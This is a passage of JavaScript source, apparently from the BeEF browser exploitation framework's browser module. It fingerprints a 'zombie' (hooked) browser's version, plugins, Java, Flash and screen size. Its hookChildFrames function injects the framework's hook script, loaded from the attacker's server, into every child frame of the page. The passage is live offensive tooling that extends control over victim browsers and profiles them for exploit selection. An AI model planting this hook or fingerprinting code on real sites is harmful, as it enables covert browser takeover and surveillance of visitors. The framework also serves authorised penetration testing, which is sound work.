            C41iOS: this.isC41iOS(), // Chrome 41 on iOS
            C42: this.isC42(), // Chrome 42
            C42iOS: this.isC42iOS(), // Chrome 42 on iOS
            C43: this.isC43(), // Chrome 43
            C43iOS: this.isC43iOS(), // Chrome 43 on iOS
            C44: this.isC44(), // Chrome 44
            C44iOS: this.isC44iOS(), // Chrome 44 on iOS
            C45: this.isC45(), // Chrome 45
            C45iOS: this.isC45iOS(), // Chrome 45 on iOS
            C46: this.isC46(), // Chrome 46
            C46iOS: this.isC46iOS(), // Chrome 46 on iOS
            C47: this.isC47(), // Chrome 47
            C47iOS: this.isC47iOS(), // Chrome 47 on iOS
            C48: this.isC48(), // Chrome 48
            C48iOS: this.isC48iOS(), // Chrome 48 on iOS
            C49: this.isC49(), // Chrome 49
            C49iOS: this.isC49iOS(), // Chrome 49 on iOS
            C50: this.isC50(), // Chrome 50
            C50iOS: this.isC50iOS(), // Chrome 50 on iOS
            C51: this.isC51(), // Chrome 51
            C51iOS: this.isC51iOS(), // Chrome 51 on iOS
            C52: this.isC52(), // Chrome 52
            C52iOS: this.isC52iOS(), // Chrome 52 on iOS
            C53: this.isC53(), // Chrome 53
            C53iOS: this.isC53iOS(), // Chrome 53 on iOS
            C54: this.isC54(), // Chrome 54
            C54iOS: this.isC54iOS(), // Chrome 54 on iOS
            C55: this.isC55(), // Chrome 55
            C55iOS: this.isC55iOS(), // Chrome 55 on iOS
            C56: this.isC56(), // Chrome 56
            C56iOS: this.isC56iOS(), // Chrome 56 on iOS
            C57: this.isC57(), // Chrome 57
            C57iOS: this.isC57iOS(), // Chrome 57 on iOS
            C58: this.isC58(), // Chrome 58
            C58iOS: this.isC58iOS(), // Chrome 58 on iOS
            C: this.isC(), // Chrome any version

            FF2: this.isFF2(), // Firefox 2
            FF3: this.isFF3(), // Firefox 3
            FF3_5: this.isFF3_5(), // Firefox 3.5
            FF3_6: this.isFF3_6(), // Firefox 3.6
            FF4: this.isFF4(), // Firefox 4
            FF5: this.isFF5(), // Firefox 5
            FF6: this.isFF6(), // Firefox 6
            FF7: this.isFF7(), // Firefox 7
            FF8: this.isFF8(), // Firefox 8
            FF9: this.isFF9(), // Firefox 9
            FF10: this.isFF10(), // Firefox 10
            FF11: this.isFF11(), // Firefox 11
            FF12: this.isFF12(), // Firefox 12
            FF13: this.isFF13(), // Firefox 13
            FF14: this.isFF14(), // Firefox 14
            FF15: this.isFF15(), // Firefox 15
            FF16: this.isFF16(), // Firefox 16
            FF17: this.isFF17(), // Firefox 17
            FF18: this.isFF18(), // Firefox 18
            FF19: this.isFF19(), // Firefox 19
            FF20: this.isFF20(), // Firefox 20
            FF21: this.isFF21(), // Firefox 21
            FF22: this.isFF22(), // Firefox 22
            FF23: this.isFF23(), // Firefox 23
            FF24: this.isFF24(), // Firefox 24
            FF25: this.isFF25(), // Firefox 25
            FF26: this.isFF26(), // Firefox 26
            FF27: this.isFF27(), // Firefox 27
            FF28: this.isFF28(), // Firefox 28
            FF29: this.isFF29(), // Firefox 29
            FF30: this.isFF30(), // Firefox 30
            FF31: this.isFF31(), // Firefox 31
            FF32: this.isFF32(), // Firefox 32
            FF33: this.isFF33(), // Firefox 33
            FF34: this.isFF34(), // Firefox 34
            FF35: this.isFF35(), // Firefox 35
            FF36: this.isFF36(), // Firefox 36
            FF37: this.isFF37(), // Firefox 37
            FF38: this.isFF38(), // Firefox 38
            FF39: this.isFF39(), // Firefox 39
            FF40: this.isFF40(), // Firefox 40
            FF41: this.isFF41(), // Firefox 41
            FF42: this.isFF42(), // Firefox 42
            FF43: this.isFF43(), // Firefox 43
            FF44: this.isFF44(), // Firefox 44
            FF45: this.isFF45(), // Firefox 45
            FF46: this.isFF46(), // Firefox 46
            FF47: this.isFF47(), // Firefox 47
            FF48: this.isFF48(), // Firefox 48
            FF49: this.isFF49(), // Firefox 49
            FF50: this.isFF50(), // Firefox 50
            FF51: this.isFF51(), // Firefox 51
            FF52: this.isFF52(), // Firefox 52
            FF53: this.isFF53(), // Firefox 53
            FF54: this.isFF54(), // Firefox 54
            FF55: this.isFF55(), // Firefox 55
            FF56: this.isFF56(), // Firefox 56
            FF: this.isFF(),   // Firefox any version

            IE6: this.isIE6(), // Internet Explorer 6
            IE7: this.isIE7(), // Internet Explorer 7
            IE8: this.isIE8(), // Internet Explorer 8
            IE9: this.isIE9(), // Internet Explorer 9
            IE10: this.isIE10(), // Internet Explorer 10
            IE11: this.isIE11(), // Internet Explorer 11
            IE: this.isIE(), // Internet Explorer any version

            O9_52: this.isO9_52(), // Opera 9.50 through 9.52
            O9_60: this.isO9_60(), // Opera 9.60 through 9.64
            O10: this.isO10(), // Opera 10.xx
            O11: this.isO11(), // Opera 11.xx
            O12: this.isO12(), // Opera 12.xx
            O: this.isO(),   // Opera any version

            S4: this.isS4(), // Safari 4.xx
            S5: this.isS5(), // Safari 5.xx
            S6: this.isS6(), // Safari 6.x
            S7: this.isS7(), // Safari 7.x
            S8: this.isS8(), // Safari 8.x
            S: this.isS()   // Safari any version
        }
    },

    /**
     * Returns the type of browser being used.
     * @return: {String} User agent software and version.
     *
     * @example: beef.browser.getBrowserVersion()
     */
    getBrowserVersion: function () {

        if (this.isC5()) {
            return '5'
        }
        ; 	// Chrome 5
        if (this.isC6()) {
            return '6'
        }
        ; 	// Chrome 6
        if (this.isC7()) {
            return '7'
        }
        ; 	// Chrome 7
        if (this.isC8()) {
            return '8'
        }
        ; 	// Chrome 8
        if (this.isC9()) {
            return '9'
        }
        ; 	// Chrome 9
        if (this.isC10()) {
            return '10'
        }
        ; 	// Chrome 10
        if (this.isC11()) {
            return '11'
        }
        ; 	// Chrome 11
        if (this.isC12()) {
            return '12'
        }
        ; 	// Chrome 12
        if (this.isC13()) {
            return '13'
        }
        ; 	// Chrome 13
        if (this.isC14()) {
            return '14'
        }
        ; 	// Chrome 14
        if (this.isC15()) {
            return '15'
        }
        ; 	// Chrome 15
        if (this.isC16()) {
            return '16'
        }
        ;	// Chrome 16
        if (this.isC17()) {
            return '17'
        }
        ;	// Chrome 17
        if (this.isC18()) {
            return '18'
        }
        ;	// Chrome 18
        if (this.isC19()) {
            return '19'
        }
        ;	// Chrome 19
        if (this.isC19iOS()) {
            return '19'
        }
        ;   // Chrome 19 for iOS
        if (this.isC20()) {
            return '20'
        }
        ;	// Chrome 20
        if (this.isC20iOS()) {
            return '20'
        }
        ;   // Chrome 20 for iOS
        if (this.isC21()) {
            return '21'
        }
        ;	// Chrome 21
        if (this.isC21iOS()) {
            return '21'
        }
        ;   // Chrome 21 for iOS
        if (this.isC22()) {
            return '22'
        }
        ;    // Chrome 22
        if (this.isC22iOS()) {
            return '22'
        }
        ;   // Chrome 22 for iOS
        if (this.isC23()) {
            return '23'
        }
        ;    // Chrome 23
        if (this.isC23iOS()) {
            return '23'
        }
        ;   // Chrome 23 for iOS
        if (this.isC24()) {
            return '24'
        }
        ;    // Chrome 24
        if (this.isC24iOS()) {
            return '24'
        }
        ;   // Chrome 24 for iOS
        if (this.isC25()) {
            return '25'
        }
        ;    // Chrome 25
        if (this.isC25iOS()) {
            return '25'
        }
        ;   // Chrome 25 for iOS
        if (this.isC26()) {
            return '26'
        }
        ;    // Chrome 26
        if (this.isC26iOS()) {
            return '26'
        }
        ;   // Chrome 26 for iOS
        if (this.isC27()) {
            return '27'
        }
        ;    // Chrome 27
        if (this.isC27iOS()) {
            return '27'
        }
        ;   // Chrome 27 for iOS
        if (this.isC28()) {
            return '28'
        }
        ;    // Chrome 28
        if (this.isC28iOS()) {
            return '28'
        }
        ;   // Chrome 28 for iOS
        if (this.isC29()) {
            return '29'
        }
        ;    // Chrome 29
        if (this.isC29iOS()) {
            return '29'
        }
        ;   // Chrome 29 for iOS
        if (this.isC30()) {
            return '30'
        }
        ;    // Chrome 30
        if (this.isC30iOS()) {
            return '30'
        }
        ;   // Chrome 30 for iOS
        if (this.isC31()) {
            return '31'
        }
        ;   // Chrome 31
        if (this.isC31iOS()) {
            return '31'
        }
        ;   // Chrome 31 for iOS
        if (this.isC32()) {
            return '32'
        }
        ;   // Chrome 32
        if (this.isC32iOS()) {
            return '32'
        }
        ;   // Chrome 32 for iOS
        if (this.isC33()) {
            return '33'
        }
        ;   // Chrome 33
        if (this.isC33iOS()) {
            return '33'
        }
        ;   // Chrome 33 for iOS
        if (this.isC34()) {
            return '34'
        }
        ;   // Chrome 34
        if (this.isC34iOS()) {
            return '34'
        }
        ;   // Chrome 34 for iOS
        if (this.isC35()) {
            return '35'
        }
        ;   // Chrome 35
        if (this.isC35iOS()) {
            return '35'
        }
        ;   // Chrome 35 for iOS
        if (this.isC36()) {
            return '36'
        }
        ;   // Chrome 36
        if (this.isC36iOS()) {
            return '36'
        }
        ;   // Chrome 36 for iOS
        if (this.isC37()) {
            return '37'
        }
        ;   // Chrome 37
        if (this.isC37iOS()) {
            return '37'
        }
        ;   // Chrome 37 for iOS
        if (this.isC38()) {
            return '38'
        }
        ;   // Chrome 38
        if (this.isC38iOS()) {
            return '38'
        }
        ;   // Chrome 38 for iOS
        if (this.isC39()) {
            return '39'
        }
        ;   // Chrome 39
        if (this.isC39iOS()) {
            return '39'
        }
        ;   // Chrome 39 for iOS
        if (this.isC40()) {
            return '40'
        }
        ;   // Chrome 40
        if (this.isC40iOS()) {
            return '40'
        }
        ;   // Chrome 40 for iOS
        if (this.isC41()) {
            return '41'
        }
        ;   // Chrome 41
        if (this.isC41iOS()) {
            return '41'
        }
        ;   // Chrome 41 for iOS
        if (this.isC42()) {
            return '42'
        }
        ;   // Chrome 42
        if (this.isC42iOS()) {
            return '42'
        }
        ;   // Chrome 42 for iOS
        if (this.isC43()) {
            return '43'
        }
        ;   // Chrome 43
        if (this.isC43iOS()) {
            return '43'
        }
        ;   // Chrome 43 for iOS
        if (this.isC44()) {
            return '44'
        }
        ;   // Chrome 44
        if (this.isC44iOS()) {
            return '44'
        }
        ;   // Chrome 44 for iOS
        if (this.isC45()) {
            return '45'
        }
        ;   // Chrome 45
        if (this.isC45iOS()) {
            return '45'
        }
        ;   // Chrome 45 for iOS
        if (this.isC46()) {
            return '46'
        }
        ;// Chrome 46
        if (this.isC46iOS()) {
            return '46'
        }
        ;   // Chrome 46 for iOS
        if (this.isC47()) {
            return '47'
        }
        ;// Chrome 47
        if (this.isC47iOS()) {
            return '47'
        }
        ;   // Chrome 47 for iOS
        if (this.isC48()) {
            return '48'
        }
        ;// Chrome 48
        if (this.isC48iOS()) {
            return '48'
        }
        ;   // Chrome 48 for iOS
        if (this.isC49()) {
            return '49'
        }
        ;// Chrome 49
        if (this.isC49iOS()) {
            return '49'
        }
        ;   // Chrome 49 for iOS
        if (this.isC50()) {
            return '50'
        }
        ;// Chrome 50
        if (this.isC50iOS()) {
            return '50'
        }
        ;   // Chrome 50 for iOS
        if (this.isC51()) {
            return '51'
        }
        ;// Chrome 51
        if (this.isC51iOS()) {
            return '51'
        }
        ;   // Chrome 51 for iOS
	    if (this.isC52()) {
            return '52'
        }
        ;// Chrome 52
        if (this.isC52iOS()) {
            return '52'
        }
        ;   // Chrome 52 for iOS
        if (this.isC53()) {
            return '53'
        }
        ;// Chrome 53
        if (this.isC53iOS()) {
            return '53'
        }
        ;   // Chrome 53 for iOS
        if (this.isC54()) {
            return '54'
        }
        ;// Chrome 54
        if (this.isC54iOS()) {
            return '54'
        }
        ;   // Chrome 54 for iOS
        if (this.isC55()) {
            return '55'
        }
        ;// Chrome 55
        if (this.isC55iOS()) {
            return '55'
        }
        ;   // Chrome 55 for iOS
        if (this.isC56()) {
            return '56'
        }
        ;// Chrome 56
        if (this.isC56iOS()) {
            return '56'
        }
        ;   // Chrome 56 for iOS
        if (this.isC57()) {
            return '57'
        }
        ;// Chrome 57
        if (this.isC57iOS()) {
            return '57'
        }
        ;   // Chrome 57 for iOS
        if (this.isC58()) {
            return '58'
        }
        ;// Chrome 58
        if (this.isC58iOS()) {
            return '58'
        }
        ;   // Chrome 58 for iOS


        if (this.isFF2()) {
            return '2'
        }
        ;	// Firefox 2
        if (this.isFF3()) {
            return '3'
        }
        ;	// Firefox 3
        if (this.isFF3_5()) {
            return '3.5'
        }
        ;	// Firefox 3.5
        if (this.isFF3_6()) {
            return '3.6'
        }
        ;	// Firefox 3.6
        if (this.isFF4()) {
            return '4'
        }
        ;	// Firefox 4
        if (this.isFF5()) {
            return '5'
        }
        ;	// Firefox 5
        if (this.isFF6()) {
            return '6'
        }
        ;	// Firefox 6
        if (this.isFF7()) {
            return '7'
        }
        ;	// Firefox 7
        if (this.isFF8()) {
            return '8'
        }
        ;	// Firefox 8
        if (this.isFF9()) {
            return '9'
        }
        ;	// Firefox 9
        if (this.isFF10()) {
            return '10'
        }
        ;	// Firefox 10
        if (this.isFF11()) {
            return '11'
        }
        ;	// Firefox 11
        if (this.isFF12()) {
            return '12'
        }
        ;	// Firefox 12
        if (this.isFF13()) {
            return '13'
        }
        ;	// Firefox 13
        if (this.isFF14()) {
            return '14'
        }
        ;	// Firefox 14
        if (this.isFF15()) {
            return '15'
        }
        ;	// Firefox 15
        if (this.isFF16()) {
            return '16'
        }
        ;	// Firefox 16
        if (this.isFF17()) {
            return '17'
        }
        ;    // Firefox 17
        if (this.isFF18()) {
            return '18'
        }
        ;    // Firefox 18
        if (this.isFF19()) {
            return '19'
        }
        ;    // Firefox 19
        if (this.isFF20()) {
            return '20'
        }
        ;    // Firefox 20
        if (this.isFF21()) {
            return '21'
        }
        ;    // Firefox 21
        if (this.isFF22()) {
            return '22'
        }
        ;   // Firefox 22
        if (this.isFF23()) {
            return '23'
        }
        ;   // Firefox 23
        if (this.isFF24()) {
            return '24'
        }
        ;   // Firefox 24
        if (this.isFF25()) {
            return '25'
        }
        ;   // Firefox 25
        if (this.isFF26()) {
            return '26'
        }
        ;   // Firefox 26
        if (this.isFF27()) {
            return '27'
        }
        ;   // Firefox 27
        if (this.isFF28()) {
            return '28'
        }
        ;   // Firefox 28
        if (this.isFF29()) {
            return '29'
        }
        ;   // Firefox 29
        if (this.isFF30()) {
            return '30'
        }
        ;   // Firefox 30
        if (this.isFF31()) {
            return '31'
        }
        ;   // Firefox 31
        if (this.isFF32()) {
            return '32'
        }
        ;   // Firefox 32
        if (this.isFF33()) {
            return '33'
        }
        ;   // Firefox 33
        if (this.isFF34()) {
            return '34'
        }
        ;   // Firefox 34
        if (this.isFF35()) {
            return '35'
        }
        ;   // Firefox 35
        if (this.isFF36()) {
            return '36'
        }
        ;   // Firefox 36
        if (this.isFF37()) {
            return '37'
        }
        ;   // Firefox 37
        if (this.isFF38()) {
            return '38'
        }
        ;   // Firefox 38
        if (this.isFF39()) {
            return '39'
        }
        ;   // Firefox 39
        if (this.isFF40()) {
            return '40'
        }
        ;   // Firefox 40
        if (this.isFF41()) {
            return '41'
        }
        ;   // Firefox 41
        if (this.isFF42()) {
            return '42'
        }
        ;   // Firefox 42
        if (this.isFF43()) {
            return '43'
        }
        ;   // Firefox 43
        if (this.isFF44()) {
            return '44'
        }
        ;   // Firefox 44
        if (this.isFF45()) {
            return '45'
        }
        ;   // Firefox 45
        if (this.isFF46()) {
            return '46'
        }
        ;   // Firefox 46
        if (this.isFF47()) {
            return '47'
        }
        ;   // Firefox 47
        if (this.isFF48()) {
            return '48'
        }
        ;   // Firefox 48
        if (this.isFF49()) {
            return '49'
        }
        ;   // Firefox 49
        if (this.isFF50()) {
            return '50'
        }
        ;   // Firefox 50
        if (this.isFF51()) {
            return '51'
        }
        ;   // Firefox 51
        if (this.isFF52()) {
            return '52'
        }
        ;   // Firefox 52
        if (this.isFF53()) {
            return '53'
        }
        ;   // Firefox 53
        if (this.isFF54()) {
            return '54'
        }
        ;   // Firefox 54
        if (this.isFF55()) {
            return '55'
        }
        ;   // Firefox 55
        if (this.isFF56()) {
            return '56'
        }
        ;   // Firefox 56

        if (this.isIE6()) {
            return '6'
        }
        ;	// Internet Explorer 6
        if (this.isIE7()) {
            return '7'
        }
        ;	// Internet Explorer 7
        if (this.isIE8()) {
            return '8'
        }
        ;	// Internet Explorer 8
        if (this.isIE9()) {
            return '9'
        }
        ;	// Internet Explorer 9
        if (this.isIE10()) {
            return '10'
        }
        ;	// Internet Explorer 10
        if (this.isIE11()) {
            return '11'
        }
        ;   // Internet Explorer 11

        if (this.isEdge()) {
            return '1'
        }
        ;   // Microsoft Edge

        if (this.isS4()) {
            return '4'
        }
        ;	// Safari 4
        if (this.isS5()) {
            return '5'
        }
        ;	// Safari 5
        if (this.isS6()) {
            return '6'
        }
        ;	// Safari 6

        if (this.isS7()) {
            return '7'
        }
        ;	// Safari 7
        if (this.isS8()) {
            return '8'
        }
        ;       // Safari 8

        if (this.isO9_52()) {
            return '9.5'
        }
        ;	// Opera 9.5x
        if (this.isO9_60()) {
            return '9.6'
        }
        ;	// Opera 9.6
        if (this.isO10()) {
            return '10'
        }
        ;	// Opera 10.xx
        if (this.isO11()) {
            return '11'
        }
        ;	// Opera 11.xx
        if (this.isO12()) {
            return '12'
        }
        ;	// Opera 12.xx

        return 'UNKNOWN';				// Unknown UA
    },

    /**
     * Returns the type of user agent by hooked browser.
     * @return: {String} User agent software.
     *
     * @example: beef.browser.getBrowserName()
     */
    getBrowserName: function () {

        if (this.isC()) {
            return 'C'
        }
        ; 	// Chrome any version
        if (this.isFF()) {
            return 'FF'
        }
        ;		// Firefox any version
        if (this.isIE()) {
            return 'IE'
        }
        ;		// Internet Explorer any version
        if (this.isEdge()) {
            return 'E'
        }
        ;       // Microsoft Edge any version
        if (this.isO()) {
            return 'O'
        }
        ;		// Opera any version
        if (this.isS()) {
            return 'S'
        }
        ;		// Safari any version
        if (this.isA()) {
            return 'A'
        }
        ;               // Avant any version
        if (this.isMidori()) {
            return 'MI'
        }
        ;               // Midori any version
        if (this.isOdyssey()) {
            return 'OD'
        }
        ;               // Odyssey any version
        if (this.isBrave()) {
            return 'BR'
        }
        ;               // Brave any version
        return 'UNKNOWN';	// Unknown UA
    },

    /**
     * Hooks all child frames in the current window
     * Restricted by same-origin policy
     */
    hookChildFrames: function () {

        // create script object
        var script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = '<%== @beef_proto %>://<%== @beef_host %>:<%== @beef_port %><%== @hook_file %>';

        // loop through child frames
        for (var i = 0; i < self.frames.length; i++) {
            try {
                // append hook script
                self.frames[i].document.body.appendChild(script);
                beef.debug("Hooked child frame [src:" + self.frames[i].window.location.href + "]");
            } catch (e) {
                // warn on cross-origin
                beef.debug("Hooking child frame failed: " + e.message);
            }
        }
    },

    /**
     * Checks if the zombie has flash installed and enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasFlash()) { ... }
     */
    hasFlash: function () {
        if (!this.type().IE) {
            return (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]);
        } else {
            flash_versions = 12;
            flash_installed = false;


            if (this.type().IE11) {
                flash_installed = (navigator.plugins["Shockwave Flash"] != undefined);
            } else {
                if (window.ActiveXObject != null) {
                    for (x = 2; x <= flash_versions; x++) {
                        try {
                            Flash = eval("new ActiveXObject('ShockwaveFlash.ShockwaveFlash." + x + "');");
                            if (Flash) {
                                flash_installed = true;
                            }
                        } catch (e) {
                            beef.debug("Creating Flash ActiveX object failed: " + e.message);
                        }
                    }
                }
            }
            return flash_installed;
        }
    },

    /**
     * Checks if the zombie has the QuickTime plugin installed.
     * @return: {Boolean} true or false.
     *
     * @example: if ( beef.browser.hasQuickTime() ) { ... }
     */
    hasQuickTime: function () {

        var quicktime = false;

        if (this.capabilities()["navigator.plugins"]) {

            for (i = 0; i < navigator.plugins.length; i++) {

                if (navigator.plugins[i].name.indexOf("QuickTime") >= 0) {
                    quicktime = true;
                }

            }

            // Has navigator.plugins
        } else {

            try {

                var qt_test = new ActiveXObject('QuickTime.QuickTime');

            } catch (e) {
                beef.debug("Creating QuickTime ActiveX object failed: " + e.message);
            }

            if (qt_test) {
                quicktime = true;
            }

        }

        return quicktime;

    },

    /**
     * Checks if the zombie has the RealPlayer plugin installed.
     * @return: {Boolean} true or false.
     *
     * @example: if ( beef.browser.hasRealPlayer() ) { ... }
     */
    hasRealPlayer: function () {

        var realplayer = false;

        if (this.capabilities()["navigator.plugins"]) {


            for (i = 0; i < navigator.plugins.length; i++) {

                if (navigator.plugins[i].name.indexOf("RealPlayer") >= 0) {
                    realplayer = true;
                }

            }

            // has navigator.plugins
        } else {

            var definedControls = [
                'RealPlayer',
                'rmocx.RealPlayer G2 Control',
                'rmocx.RealPlayer G2 Control.1',
                'RealPlayer.RealPlayer(tm) ActiveX Control (32-bit)',
                'RealVideo.RealVideo(tm) ActiveX Control (32-bit)'
            ];

            for (var i = 0; i < definedControls.length; i++) {

                try {
                    var rp_test = new ActiveXObject(definedControls[i]);
                } catch (e) {
                    beef.debug("Creating RealPlayer ActiveX object failed: " + e.message);
                }

                if (rp_test) {
                    realplayer = true;

                }
            }
        }

        return realplayer;

    },

    /**
     * Checks if the zombie has the Windows Media Player plugin installed.
     * @return: {Boolean} true or false.
     *
     * @example: if ( beef.browser.hasWMP() ) { ... }
     */
    hasWMP: function () {

        var wmp = false;

        if (this.capabilities()["navigator.plugins"]) {


            for (i = 0; i < navigator.plugins.length; i++) {

                if (navigator.plugins[i].name.indexOf("Windows Media Player") >= 0) {
                    wmp = true;
                }

            }

            // Has navigator.plugins
        } else {

            try {

                var wmp_test = new ActiveXObject('WMPlayer.OCX');

            } catch (e) {
                beef.debug("Creating WMP ActiveX object failed: " + e.message);
            }

            if (wmp_test) {
                wmp = true;
            }

        }

        return wmp;

    },

    /**
     *  Checks if VLC is installed
     *  @return: {Boolean} true or false
     **/
    hasVLC: function () {
        var vlc = false;
        if (!this.type().IE) {
            for (i = 0; i < navigator.plugins.length; i++) {
                if (navigator.plugins[i].name.indexOf("VLC") >= 0) {
                    vlc = true;
                }
            }
        } else {
            try {
                control = new ActiveXObject("VideoLAN.VLCPlugin.2");
                vlc = true;
            } catch (e) {
                beef.debug("Creating VLC ActiveX object failed: " + e.message);
            }
        }
        return vlc;
    },

    /**
     * Checks if the zombie has Java enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.javaEnabled()) { ... }
     */
    javaEnabled: function () {

        return navigator.javaEnabled();

    },

    /**
     * Checks if the Phonegap API is available from the hooked origin.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasPhonegap()) { ... }
     */
    hasPhonegap: function () {
        var result = false;

        try {
            if (!!device.phonegap || !!device.cordova) result = true; else result = false;
        }
        catch (e) {
            result = false;
        }
        return result;
    },

    /**
     * Checks if the browser supports CORS
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasCors()) { ... }
     */
    hasCors: function () {
        if ('withCredentials' in new XMLHttpRequest())
            return true;
        else if (typeof XDomainRequest !== "undefined")
            return true;
        else
            return false;
    },

    /**
     * Checks if the zombie has Java installed and enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasJava()) { ... }
     */
    hasJava: function () {
        if (beef.browser.getPlugins().match(/java/i) && beef.browser.javaEnabled()) {
          return true;
        } else {
          return false;
        }
    },

    /**
     * Checks if the zombie has VBScript enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasVBScript()) { ... }
     */
    hasVBScript: function () {
        if ((navigator.userAgent.indexOf('MSIE') != -1) && (navigator.userAgent.indexOf('Win') != -1)) {
            return true;
        } else {
            return false;
        }
    },

    /**
     * Returns the list of plugins installed in the browser.
     */
    getPlugins: function () {

        var results;
        Array.prototype.unique = function () {
            var o = {}, i, l = this.length, r = [];
            for (i = 0; i < l; i += 1) o[this[i]] = this[i];
            for (i in o) r.push(o[i]);
            return r;
        };

        // Things lacking navigator.plugins
        if (!this.capabilities()["navigator.plugins"]) results = this.getPluginsIE();

        // All other browsers that support navigator.plugins
        else if (navigator.plugins && navigator.plugins.length > 0) {
            results = new Array();
            for (var i = 0; i < navigator.plugins.length; i++) {

                // Firefox returns exact plugin versions
                if (beef.browser.isFF()) results[i] = navigator.plugins[i].name + '-v.' + navigator.plugins[i].version;

                // Webkit and Presto (Opera)
                // Don't support the version attribute
                // Sometimes store the version in description (Real, Adobe)
                else results[i] = navigator.plugins[i].name;// + '-desc.' + navigator.plugins[i].description;
            }
            results = results.unique().toString();

            // All browsers that don't support navigator.plugins
        } else {
            results = new Array();
            //firefox https://bugzilla.mozilla.org/show_bug.cgi?id=757726
            // On linux sistem the "version" slot is empty so I'll attach "description" after version
            var plugins = {

                'AdobeAcrobat': {
                    'control': 'Adobe Acrobat',
                    'return': function (control) {
                        try {
                            version = navigator.plugins["Adobe Acrobat"]["description"];
                            return 'Adobe Acrobat Version  ' + version; //+ " description "+ filename;

                        }
                        catch (e) {
                        }


                    }},
                'Flash': {
                    'control': 'Shockwave Flash',
                    'return': function (control) {
                        try {
                            version = navigator.plugins["Shockwave Flash"]["description"];
                            return 'Flash Player Version ' + version; //+ " description "+ filename;
                        }

                        catch (e) {
                        }
                    }},
                'Google_Talk_Plugin_Accelerator': {
                    'control': 'Google Talk Plugin Video Accelerator',
                    'return': function (control) {

                        try {
                            version = navigator.plugins['Google Talk Plugin Video Accelerator']["description"];
                            return 'Google Talk Plugin Video Accelerator Version ' + version; //+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Google_Talk_Plugin': {
                    'control': 'Google Talk Plugin',
                    'return': function (control) {
                        try {
                            version = navigator.plugins['Google Talk Plugin']["description"];
                            return 'Google Talk Plugin Version ' + version;// " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Facebook_Video_Calling_Plugin': {
                    'control': 'Facebook Video Calling Plugin',
                    'return': function (control) {
                        try {
                            version = navigator.plugins["Facebook Video Calling Plugin"]["description"];
                            return 'Facebook Video Calling Plugin Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Google_Update': {
                    'control': 'Google Update',
                    'return': function (control) {
                        try {
                            version = navigator.plugins["Google Update"]["description"];
                            return 'Google Update Version ' + version//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Windows_Activation_Technologies': {
                    'control': 'Windows Activation Technologies',
                    'return': function (control) {
                        try {
                            version = navigator.plugins["Windows Activation Technologies"]["description"];
                            return 'Windows Activation Technologies Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }

                    }},
                'VLC_Web_Plugin': {
                    'control': 'VLC Web Plugin',
                    'return': function (control) {
                        try {
                            version = navigator.plugins["VLC Web Plugin"]["description"];
                            return 'VLC Web Plugin Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Google_Earth_Plugin': {
                    'control': 'Google Earth Plugin',

                    'return': function (control) {
                        try {
                            version = navigator.plugins['Google Earth Plugin']["description"];
                            return 'Google Earth Plugin Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'FoxitReader_Plugin': {
                    'control': 'FoxitReader Plugin',
                    'return': function (control) {
                        try {
                            version = navigator.plugins['Foxit Reader Plugin for Mozilla']['version'];
                            return 'FoxitReader Plugin Version ' + version;
                        } catch (e) {
                        }
                    }}
            };

            var c = 0;
            for (var i in plugins) {
                //each element od plugins
                var control = plugins[i]['control'];
                try {
                    var version = plugins[i]['return'](control);
                    if (version) {
                        results[c] = version;
                        c = c + 1;
                    }
                }
                catch (e) {
                }

            }
        }
        // Return results
        return results;
    },

    /**
     * Returns a list of plugins detected by IE. This is a hack because IE doesn't
     * support navigator.plugins
     */
    getPluginsIE: function () {
        var results = '';
        var plugins = {'AdobePDF6': {
            'control': 'PDF.PdfCtrl',
            'return': function (control) {
                version = control.getVersions().split(',');
                version = version[0].split('=');
                return 'Acrobat Reader v' + parseFloat(version[1]);
            }},
            'AdobePDF7': {
                'control': 'AcroPDF.PDF',
                'return': function (control) {
                    version = control.getVersions().split(',');
                    version = version[0].split('=');
                    return 'Acrobat Reader v' + parseFloat(version[1]);
                }},
            'Flash': {
                'control': 'ShockwaveFlash.ShockwaveFlash',
                'return': function (control) {
                    version = control.getVariable('$version').substring(4);
                    return 'Flash Player v' + version.replace(/,/g, ".");
                }},
            'Quicktime': {
                'control': 'QuickTime.QuickTime',
                'return': function (control) {
                    return 'QuickTime Player';
                }},
            'RealPlayer': {
                'control': 'RealPlayer',
                'return': function (control) {
                    version = control.getVersionInfo();
                    return 'RealPlayer v' + parseFloat(version);
                }},
            'Shockwave': {
                'control': 'SWCtl.SWCtl',
                'return': function (control) {
                    version = control.ShockwaveVersion('').split('r');
                    return 'Shockwave v' + parseFloat(version[0]);
                }},
            'WindowsMediaPlayer': {
                'control': 'WMPlayer.OCX',
                'return': function (control) {
                    return 'Windows Media Player v' + parseFloat(control.versionInfo);
                }},
            'FoxitReaderPlugin': {
                'control': 'FoxitReader.FoxitReaderCtl.1',
                'return': function (control) {
                    return 'Foxit Reader Plugin v' + parseFloat(control.versionInfo);
                }}
        };
        if (window.ActiveXObject) {
            var j = 0;
            for (var i in plugins) {
                var control = null;
                var version = null;
                try {
                    control = new ActiveXObject(plugins[i]['control']);
                } catch (e) {
                }
                if (control) {
                    if (j != 0)
                        results += ', ';
                    results += plugins[i]['return'](control);
                    j++;
                }
            }
        }
        return results;
    },

    /**
     * Returns zombie screen size and color depth.
     */
    getScreenSize: function () {
        return {
            width: window.screen.width,
            height: window.screen.height,
            colordepth: window.screen.colorDepth
        }
    },

    /**
     * Returns zombie browser window size.
     * @from: http://www.howtocreate.co.uk/tutorials/javascript/browserwindow
     */
    getWindowSize: function () {
        var myWidth = 0, myHeight = 0;
        if (typeof( window.innerWidth ) == 'number') {
            // Non-IE
            myWidth = window.innerWidth;
            myHeight = window.innerHeight;
